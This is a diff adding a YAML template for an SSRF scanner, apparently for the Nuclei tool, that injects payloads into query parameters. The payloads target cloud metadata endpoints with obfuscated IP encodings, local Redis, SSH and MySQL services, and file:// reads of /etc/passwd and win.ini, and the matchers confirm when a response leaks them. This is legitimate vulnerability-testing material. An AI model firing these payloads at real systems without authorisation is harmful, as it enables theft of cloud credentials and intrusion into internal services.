@@ -1,0 +1,143 @@
+id: response-ssrf-pj
+
+info:
+  name: Full Response SSRF Detection
+  author: pdteam,pwnhxl
+  severity: high
+  reference:
+    - https://github.com/bugcrowd/HUNT/blob/master/ZAP/scripts/passive/SSRF.py
+    - https://sanderwind.medium.com/escalating-ssrf-to-rce-7c0147371c40
+    - https://twitter.com/hacker_/status/1694554718574710865
+  tags: fuzzing-ssrf,fuzzing-req
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    payloads:
+      ssrf:
+        - '//{{interactsh-url}}'
+        - '@{{interactsh-url}}'
+        - '\@{{interactsh-url}}'
+        - '\\@{{interactsh-url}}'
+        - '\\{{interactsh-url}}'
+        - 'app-169-254-169-254.nip.io/latest/meta-data/'
+        - 'dict://127.0.0.1:6379/info'
+        - 'file:////./etc/./passwd'
+        - 'file:///c:/./windows/./win.ini'
+        - 'gopher://{{interactsh-url}}'
+        - 'http://0177.0.0.1:22/'
+        - 'http://025177524776/latest/meta-data/'
+        - 'http://0:22/'
+        - 'http://0o177.0.0.1:22/'
+        - 'http://0xa9fea9fe/latest/meta-data/'
+        - 'http://0xa9fea9fe/latest/meta-data/'
+        - 'http://0xa9fea9fe/latest/meta-data/'
+        - 'http://0xa9fea9fe/latest/meta-data/'
+        - 'http://100.100.100.200/latest/meta-data/'
+        - 'http://127.0.0.1:22'
+        - 'http://127.0.0.1:3306'
+        - 'http://127.0.1:22/'
+        - 'http://127.1:22/'
+        - 'http://169.254.169.254/latest/meta-data/'
+        - 'http://169.254.169.254/metadata/v1'
+        - 'http://2130706433:22/'
+        - 'http://2852039166/latest/meta-data/'
+        - 'http://2852039166/metadata/v1'
+        - 'http://::ffff:a9fe:a9fe/latest/meta-data/'
+        - 'http://[0000::1]:22/'
+        - 'http://[0:0:0:0:0:ffff:127.0.0.1]:22/'
+        - 'http://[::169.254.169.254]/latest/meta-data/'
+        - 'http://[::]:22/'
+        - 'http://[::ffff:127.0.0.1]:22/'
+        - 'http://[::ffff:169.254.169.254]/'
+        - 'http://ex.ploit.info/latest/user-data'
+        - 'http://instance-data'
+        - 'http://ipv6.metadata.301party.com'
+        - 'http://ipv6.metadata.301party.com/latest/meta-data/'
+        - 'http://metadata.301party.com'
+        - 'http://metadata.301party.com/latest/meta-data/'
+        - 'http://metadata.tencentyun.com/latest/meta-data/'
+        - 'http://xxx@169.254.169.254'
+        - 'http://{{interactsh-url}}'
+        - 'https://301party.com/metadata'
+        - 'https://301party.com/metadata6'
+        - 'https://{{interactsh-url}}'
+        - '{{interactsh-url}}'
+        
+    fuzzing:
+      - part: query
+        mode: multiple
+        type: replace
+        fuzz:
+          - "{{ssrf}}"
+          
+      - part: query
+        mode: multiple
+        type: replace
+        values:
+          - "(https|http|file)(%3A%2F%2F|://)(.*?)"
+        fuzz:
+          - "{{ssrf}}"
+
+    stop-at-first-match: true
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
+          
+      - type: word
+        part: body
+        words:
+          - "ami-id"
+          - "hostname"
+          - "security-groups"
+        condition: and
+
+      - type: regex
+        part: body
+        regex:
+          - 'SSH-(\d.\d)-OpenSSH_(\d.\d)'
+
+      - type: regex
+        part: body
+        regex:
+          - '(DENIED Redis|CONFIG REWRITE|NOAUTH Authentication)'
+
+      - type: regex
+        part: body
+        regex:
+          - '(\d.\d.\d)(.*?)mysql_native_password'
+
+      - type: regex
+        part: body
+        regex:
+          - 'root:.*?:[0-9]*:[0-9]*:'
+
+      - type: word
+        part: body
+        words:
+          - 'for 16-bit app support'
+
+      - type: regex
+        part: body
+        regex:
+          - 'dns-conf/(.*?)instance/'
+
+      - type: regex
+        part: body
+        regex:
+          - 'app-id(.*?)placement/'
+
+      - type: regex
+        part: body
+        regex:
+          - 'ami-id(.*?)placement/'
+
+      - type: regex
+        part: body
+        regex:
+          - 'id(.*?)interfaces/'
